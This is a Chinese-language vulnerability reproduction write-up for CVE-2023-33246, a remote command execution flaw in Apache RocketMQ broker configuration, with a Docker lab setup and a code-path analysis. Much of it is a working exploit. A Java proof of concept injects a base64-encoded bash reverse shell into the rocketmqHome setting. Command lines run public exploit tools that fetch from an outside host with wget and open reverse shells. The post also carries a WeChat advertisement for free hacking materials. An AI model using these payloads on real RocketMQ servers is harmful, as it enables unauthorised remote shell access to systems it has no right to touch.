RocketMQ是一款低延迟、高并发、高可用、高可靠的分布式消息中间件。既可为分布式应用系统提供异步解耦和削峰填谷的能力，同时也具备互联网应用所需的海量消息堆积、高吞吐、可靠重试等特性。

#### 影响版本

<=`RocketMQ 5.1.0`

<=`RocketMQ 4.9.5`

#### 环境搭建

    
    
    docker pull apache/rocketmq:4.9.4

![image-20230605153453593](https://image.3001.net/images/20230619/1687155264_648ff240dfe624c43fb49.png!small)

    
    
    root@ubuntu:/home/ubuntu/Desktop# docker run -d --name rmqnamesrv -p 9876:9876 apache/rocketmq:4.9.4 sh mqnamesrv      //起nameserver

创建broker.conf，并且修改配置文件内容

![image-20230615155042723](https://image.3001.net/images/20230619/1687155266_648ff24214f425a2d7eae.png!small)

    
    
    root@ubuntu:/home/ubuntu/Desktop# docker run -d --name rmqbroker --link rmqnamesrv:namesrv -e "NAMESRV_ADDR=namesrv:9876" -p 10909:10909 -p 10911:10911 -p 10912:10912 apache/rocketmq:4.9.4 sh mqbroker -c /home/rocketmq/rocketmq-4.9.4/conf/broker.conf    //起Broker

![image-20230608173548843](https://image.3001.net/images/20230619/1687155266_648ff242e4db49c4e7ab8.png!small)

    
    
    docker ps

![image-20230608173815060](https://image.3001.net/images/20230619/1687155268_648ff24407f2e2488db80.png!small)

> <http://127.0.0.1:10912/>

![image-20230608173919660](https://image.3001.net/images/20230619/1687155269_648ff24536bd9692e140e.png!small)

    
    
    python3 check.py --ip 10.10.14.72 --port 9876

![image-20230612101500792](https://image.3001.net/images/20230619/1687155270_648ff24634cbeadf99256.png!small)

    
    
    python3 CVE-2023-33246_RocketMQ_RCE_EXPLOIT.py 10.10.14.72 10911 wget  10.10.14.162:8666/1.txt

![image-20230612125101859](https://image.3001.net/images/20230619/1687155271_648ff24732488df114d83.png!small)

使用vulhub直接搭建可能效果好一点儿，否则，不知道为什么在漏洞利用执行上面命令的时候无回显，可能exp的问题

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

    
    
    cd vulhub/rocketmq/CVE-2023-33246  
    docker-compose up -d

POC如下

    
    
    import org.apache.rocketmq.tools.admin.DefaultMQAdminExt;  
    ​  
    import java.util.Base64;  
    import java.util.Properties;  
    ​  
    public class poc {  
      private static String getCmd(String ip, String port) {  
          String cmd = "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";  
          String cmdBase = Base64.getEncoder().encodeToString(cmd.getBytes());  
          return "-c $@|sh . echo echo \"" + cmdBase + "\"|base64 -d|bash -i;";  
      }  
    ​  
      public static void main(String[] args) throws Exception {  
          String targetHost = "目的IP";  
          String targetPort = "10911";  
        
          String shellHost = "VPSIP";  
          String shellPort = "Listen-port";  
        
          String targetAddr = String.format("%s:%s",targetHost,targetPort);  
          Properties props = new Properties();  
          props.setProperty("rocketmqHome", getCmd(shellHost,shellPort));  
          props.setProperty("filterServerNums", "1");  
          // 创建 DefaultMQAdminExt 对象并启动  
          DefaultMQAdminExt admin = new DefaultMQAdminExt();  
    ​  
    //        admin.setNamesrvAddr("0.0.0.0:12345");  
          admin.start();  
          // 更新配置⽂件  
          admin.updateBrokerConfig(targetAddr, props);  
          Properties brokerConfig = admin.getBrokerConfig(targetAddr);  
          System.out.println(brokerConfig.getProperty("rocketmqHome"));  
          System.out.println(brokerConfig.getProperty("filterServerNums"));  
          // 关闭 DefaultMQAdminExt 对象  
          admin.shutdown();  
      }  
    }

使用IDEA创建maven项目，创建xml文件下载依赖,下载地址

> <https://mvnrepository.com/artifact/org.apache.rocketmq/rocketmq-> tools/4.9.4>

![image-20230615100244421](https://image.3001.net/images/20230619/1687155272_648ff24859e35f36737e9.png!small)

    
    
    <!-- https://mvnrepository.com/artifact/org.apache.rocketmq/rocketmq-tools -->  
    <dependency>  
      <groupId>org.apache.rocketmq</groupId>  
      <artifactId>rocketmq-tools</artifactId>  
      <version>4.9.4</version>  
    </dependency>

![image-20230615103757592](https://image.3001.net/images/20230619/1687155273_648ff2498df66dcc0565b.png!small)

修改POC

    
    
    import org.apache.rocketmq.tools.admin.DefaultMQAdminExt;  
    ​  
    import java.util.Base64;  
    import java.util.Properties;  
    ​  
    public class poc {  
      private static String getCmd(String ip, String port) {  
          String cmd = "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";  
          String cmdBase = Base64.getEncoder().encodeToString(cmd.getBytes());  
          return "-c $@|sh . echo echo \"" + cmdBase + "\"|base64 -d|bash -i;";  
      }  
    ​  
      public static void main(String[] args) throws Exception {  
          String targetHost = "10.10.14.72";  
          String targetPort = "10911";  
        
          String shellHost = "10.10.14.72";  
          String shellPort = "65532";  
        
          String targetAddr = String.format("%s:%s",targetHost,targetPort);  
          Properties props = new Properties();  
          props.setProperty("rocketmqHome", getCmd(shellHost,shellPort));  
          props.setProperty("filterServerNums", "1");  
          // 创建 DefaultMQAdminExt 对象并启动  
          DefaultMQAdminExt admin = new DefaultMQAdminExt();  
    ​  
    //        admin.setNamesrvAddr("0.0.0.0:12345");  
          admin.start();  
          // 更新配置⽂件  
          admin.updateBrokerConfig(targetAddr, props);  
          Properties brokerConfig = admin.getBrokerConfig(targetAddr);  
          System.out.println(brokerConfig.getProperty("rocketmqHome"));  
          System.out.println(brokerConfig.getProperty("filterServerNums"));  
          // 关闭 DefaultMQAdminExt 对象  
          admin.shutdown();  
      }  
    }

反弹结果

![image-20230615115733747](https://image.3001.net/images/20230619/1687155274_648ff24ac7b5ce19d5c77.png!small)

    
    
    git clone https://github.com/SuperZero/CVE-2023-33246.git  
    java -jar CVE-2023-33246.jar -ip "127.0.0.1:10911" -cmd "222 >/root/2.txt"

![image-20230615153715566](https://image.3001.net/images/20230619/1687155275_648ff24beb6c76a467ddc.png!small)

进入容器，查看根部录下文件是已写入

![image-20230615153833934](https://image.3001.net/images/20230619/1687155277_648ff24d368d64224e82d.png!small)

    
    
    java -jar CVE-2023-33246.jar -ip "127.0.0.1:10911" -cmd "bash -i >& /dev/tcp/10.10.14.72/65532 0>&1"

反弹shell

![image-20230615162234961](https://image.3001.net/images/20230619/1687155278_648ff24e317c30ab0009a.png!small)

#### 漏洞分析

启动broker路由如下：

    
    
    main:50, BrokerStartup (org.apache.rocketmq.broker)  
    start:55, BrokerStartup (org.apache.rocketmq.broker)   
    start:1570, BrokerController (org.apache.rocketmq.broker)   
    startBasicService:1527, BrokerController (org.apache.rocketmq.broker)   
    start:57, FilterServerManager (org.apache.rocketmq.broker.filtersrv)

当在函数`org.apache.rocketmq.broker.filtersrv.FilterServerManager`61行

![image-20230616102658128](https://image.3001.net/images/20230619/1687155279_648ff24f1c083919e991a.png!small)

调用下面的`createFilterServer`方法，71行中看到从配置文件中获取参数。72行调用方法`buildStartCommand`

![image-20230616105316243](https://image.3001.net/images/20230619/1687155280_648ff25037f6eaa43c0d2.png!small)

该方法中取到变量`NamesrvAddr`和 `RocketmqHome`,获取之后进行拼接cmd，在72行拿到拼接后的`cmd`

![image-20230616105415604](https://image.3001.net/images/20230619/1687155281_648ff2518acc2cf606858.png!small)

进入for循环后在`org.apache.rocketmq.broker.filtersrv.FilterServerUtil`中给的`callshell`方法去执行命令

![image-20230616105538500](https://image.3001.net/images/20230619/1687155282_648ff2526a1eb9ad84e57.png!small)

该中间件本来就是每30秒执行一次，漏洞产生的就是修改了配置文件，变量被赋值为了恶意命令，导致了命令执行。

![image-20230616105824880](https://image.3001.net/images/20230619/1687155283_648ff2535c771f765d0ee.png!small)

###  **更多网安技能的在线实操练习，[请点击这里>>﻿](https://www.hetianlab.com/)**

  

